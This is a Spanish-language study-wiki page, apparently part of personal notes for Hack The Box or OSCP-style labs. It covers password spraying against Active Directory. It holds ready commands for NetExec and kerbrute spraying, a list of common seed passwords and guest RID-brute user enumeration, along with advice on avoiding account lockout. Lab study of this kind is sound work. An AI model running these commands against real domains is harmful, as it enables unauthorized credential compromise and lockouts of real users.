# Técnica: password spraying

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**7 máquina(s)** mencionan esta técnica.

Alias buscados: `passwordspray`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>`

### LEÉ ESTO ANTES DE DISPARAR

**Una cuenta bloqueada en el DC del examen es un problema real** y no siempre se
destraba. La política de bloqueo decide si esto es viable.

```bash
# SIEMPRE primero
/usr/bin/nxc smb <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --pass-pol
```

| Umbral de bloqueo | Qué hacer |
| --- | --- |
| 0 (deshabilitado) | Sin riesgo teórico, pero igual sé prudente |
| 5 o más | Viable con 3 intentos o menos por pasada |
| 1–3 | **No hagas spraying.** Bloqueás cuentas. |
| Desconocido | Tratalo como si fuera 1 → no lo hagas |

### La distinción clave: spraying ≠ fuerza bruta

- **Spraying** (correcto): **una** contraseña contra **muchos** usuarios.
- **Fuerza bruta** (incorrecto para AD): muchas contraseñas contra un usuario.

El spraying consulta el bloqueo por usuario una vez por pasada. La fuerza bruta
lo revienta.

### Construir la lista de contraseñas

**No arranques con `rockyou.txt` contra AD.** Es la forma más rápida de bloquear
cuentas y casi nunca acierta. Sembrá con el contexto:

```bash
cat > /tmp/pass.txt << 'FIN_P'
Password123!
Password123
<Empresa>2024
<Empresa>2025
<Empresa>2026
<empresa>123
Welcome123!
Welcome1
Changeme123
Summer2025!
Winter2025!
<Dominio>123
<Dominio>123!
FIN_P
```

Sumá estaciones + año, y lo que hayas visto en la política de contraseñas
(longitud mínima, complejidad).

### Ejecutar

```bash
# NetExec — respeta el bloqueo si le pasás la política
/usr/bin/nxc smb <DC_IP> -u usuarios.txt -p 'Password123!' -d <DOMINIO> --continue-on-success

# Varias contraseñas, de a UNA por pasada (con pausa entre pasadas)
for p in 'Password123!' 'Welcome123!' '<Empresa>2025'; do
  echo "=== $p ==="
  /usr/bin/nxc smb <DC_IP> -u usuarios.txt -p "$p" -d <DOMINIO> --continue-on-success
  sleep 60   # deja pasar la ventana de bloqueo
done
```

> **`--continue-on-success` NO es opcional.** Sin ese flag NetExec corta en el
> primer acierto y te perdés todas las demás cuentas que compartían la misma
> contraseña.

### Alternativa por Kerberos (si tenés kerbrute)

```bash
kerbrute passwordspray -d <dominio.local> --dc <DC_IP> usuarios.txt 'Password123!'
```

> `kerbrute` **no está instalado** en tu Kali y no está en apt. Hay que bajarlo
> de GitHub. Ver [[verificado-2026]].

### Enumerar usuarios primero (sin credenciales)

```bash
/usr/bin/nxc smb <DC_IP> -u 'guest' -p '' --rid-brute
/usr/bin/nxc smb <DC_IP> -u '' -p '' --rid-brute
```

Eso te da la lista de usuarios por RID, incluso cuando LDAP no responde.

### Registrá lo que probaste

NetExec guarda los resultados en `~/.nxc/workspaces/default/`. **Repetir una
contraseña ya probada es exactamente lo que bloquea cuentas.**

```bash
# Ver qué quedó guardado
/usr/bin/nxc smb <DC_IP> --users
```

> Si ves `Schema mismatch detected`, la DB está rota y **no se están guardando
> los resultados**. Arreglalo antes de hacer spraying. Ver [[verificado-2026]].

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/

---

## Máquinas

- [[htb-apt\|APT]] — 5 mención(es) · Windows · Insane
- [[htb-phantom\|Phantom]] — 2 mención(es) · Windows · Medium
- [[htb-sekhmet\|Sekhmet]] — 2 mención(es) · Windows · Insane
- [[htb-darkcorp\|DarkCorp]] — 1 mención(es) · Windows · Insane
- [[htb-lustroustwo\|LustrousTwo]] — 1 mención(es) · Windows · Hard
- [[htb-monteverde\|Monteverde]] — 1 mención(es) · Windows · Medium
- [[htb-resolute\|Resolute]] — 1 mención(es) · Windows · Medium

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'password spraying' -v
python3 _sistema/herramientas/buscar.py 'password spraying' -v --oscp
```
